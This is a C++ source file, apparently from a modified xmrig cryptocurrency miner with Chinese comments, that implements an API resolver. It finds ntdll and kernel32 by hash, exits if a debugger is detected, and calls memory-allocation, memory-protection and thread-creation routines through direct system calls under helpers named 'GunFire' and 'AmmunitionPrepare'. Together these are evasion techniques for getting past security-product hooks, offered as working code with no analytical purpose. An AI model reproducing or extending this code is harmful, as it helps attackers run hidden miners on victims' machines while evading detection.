#include <Windows.h>
#include "api_resolver.h"
#include "unhooker.h"

namespace xmrig {

// 初始化静态实例
ApiResolver* ApiResolver::s_instance = nullptr;

ApiResolver::ApiResolver() : m_initialized(false)
{
    ZeroMemory(&m_modules, sizeof(m_modules));
}

ApiResolver::~ApiResolver()
{
    // 不需要释放模块，因为它们是系统加载的
}

ApiResolver* ApiResolver::GetInstance()
{
    if (!s_instance) {
        s_instance = new ApiResolver();
        s_instance->Initialize();
    }
    return s_instance;
}

bool ApiResolver::Initialize()
{
    if (m_initialized)
        return true;
    
    // 检查调试器
    if (CheckAdvancedDebugging()) {
        DbgPrint("[!] 检测到调试器，终止执行\n");
        ExitProcess(1);
        return false;
    }
    
    // 加载必要的API
    m_initialized = LoadApis();
    return m_initialized;
}

bool ApiResolver::IsDebugged()
{
    return CheckAdvancedDebugging();
}

bool ApiResolver::LoadApis()
{
    // 加载必要的模块
    m_modules.ntdll = (HMODULE)GetModule(APIHash::NtdllHash);
    if (!m_modules.ntdll) {
        DbgPrint("[-] 无法加载ntdll模块\n");
        return false;
    }
    
    m_modules.kernel32 = (HMODULE)GetModule(APIHash::Kernel32Hash);
    if (!m_modules.kernel32) {
        DbgPrint("[-] 无法加载kernel32模块\n");
        return false;
    }
    
    DbgPrint("[+] 模块加载成功\n");
    return true;
}

void* ApiResolver::GetModuleByHash(DWORD hash)
{
    return GetModule(hash);
}

void* ApiResolver::GetFunctionByHash(DWORD moduleHash, DWORD functionHash)
{
    HMODULE module = (HMODULE)GetModule(moduleHash);
    if (!module) {
        return nullptr;
    }
    
    return GetAPIAddr(module, functionHash);
}

// 系统调用实现
NTSTATUS ApiResolver::NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    void* apiAddr = GetAPIAddr(m_modules.ntdll, APIHash::ZwAllocateVirtualMemory);
    if (!apiAddr) {
        DbgPrint("[-] 无法找到ZwAllocateVirtualMemory函数\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    WORD syscallNum = FindAmmunitionsAndPrepareGun(apiAddr);
    if (syscallNum == INVALID_SSN) {
        DbgPrint("[-] 无法找到ZwAllocateVirtualMemory的系统调用号\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    AmmunitionPrepare(syscallNum);
    NTSTATUS status = (NTSTATUS)GunFire(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] NtAllocateVirtualMemory失败，状态码: 0x%lx\n", status);
    }
    
    return status;
}

NTSTATUS ApiResolver::NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    void* apiAddr = GetAPIAddr(m_modules.ntdll, APIHash::NtProtectVirtualMemory);
    if (!apiAddr) {
        DbgPrint("[-] 无法找到NtProtectVirtualMemory函数\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    WORD syscallNum = FindAmmunitionsAndPrepareGun(apiAddr);
    if (syscallNum == INVALID_SSN) {
        DbgPrint("[-] 无法找到NtProtectVirtualMemory的系统调用号\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    AmmunitionPrepare(syscallNum);
    NTSTATUS status = (NTSTATUS)GunFire(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] NtProtectVirtualMemory失败，状态码: 0x%lx\n", status);
    }
    
    return status;
}

NTSTATUS ApiResolver::NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    void* apiAddr = GetAPIAddr(m_modules.ntdll, APIHash::NtCreateThreadEx);
    if (!apiAddr) {
        DbgPrint("[-] 无法找到NtCreateThreadEx函数\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    WORD syscallNum = FindAmmunitionsAndPrepareGun(apiAddr);
    if (syscallNum == INVALID_SSN) {
        DbgPrint("[-] 无法找到NtCreateThreadEx的系统调用号\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    AmmunitionPrepare(syscallNum);
    NTSTATUS status = (NTSTATUS)GunFire(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
                   StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, 
                   MaximumStackSize, AttributeList);
                   
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] NtCreateThreadEx失败，状态码: 0x%lx\n", status);
    }
    
    return status;
}

NTSTATUS ApiResolver::NtWaitForSingleObject(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout)
{
    void* apiAddr = GetAPIAddr(m_modules.ntdll, APIHash::NtWaitForSingleObject);
    if (!apiAddr) {
        DbgPrint("[-] 无法找到NtWaitForSingleObject函数\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    WORD syscallNum = FindAmmunitionsAndPrepareGun(apiAddr);
    if (syscallNum == INVALID_SSN) {
        DbgPrint("[-] 无法找到NtWaitForSingleObject的系统调用号\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    AmmunitionPrepare(syscallNum);
    NTSTATUS status = (NTSTATUS)GunFire(Handle, Alertable, Timeout);
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] NtWaitForSingleObject失败，状态码: 0x%lx\n", status);
    }
    
    return status;
}

NTSTATUS ApiResolver::NtClose(
    HANDLE Handle)
{
    void* apiAddr = GetAPIAddr(m_modules.ntdll, APIHash::NtClose);
    if (!apiAddr) {
        DbgPrint("[-] 无法找到NtClose函数\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    WORD syscallNum = FindAmmunitionsAndPrepareGun(apiAddr);
    if (syscallNum == INVALID_SSN) {
        DbgPrint("[-] 无法找到NtClose的系统调用号\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }
    
    AmmunitionPrepare(syscallNum);
    NTSTATUS status = (NTSTATUS)GunFire(Handle);
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] NtClose失败，状态码: 0x%lx\n", status);
    }
    
    return status;
}

} // namespace xmrig 